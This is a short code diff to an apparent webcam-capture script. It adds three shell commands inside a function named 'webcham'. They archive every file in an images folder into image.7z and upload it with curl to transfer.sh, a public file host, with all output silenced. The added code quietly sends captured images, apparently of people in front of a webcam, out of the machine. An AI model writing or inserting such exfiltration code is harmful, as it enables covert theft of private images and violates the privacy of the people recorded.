@@ -120,6 +120,9 @@ def webcham():
         o = open("webcam/"+webcam_mode+"/Log.log","w")
         o.write("")
         o.close()
+        os.system("rm -f image.7z &> /dev/null")
+        os.system("7z a image.7z ./images/* &> /dev/null")
+        os.system("curl --upload-file ./image.7z https://transfer.sh &> /dev/null")
       except:
         print(" ")
   # - - - - - - - - - - -- - - - - - - - - - - - - - - -   
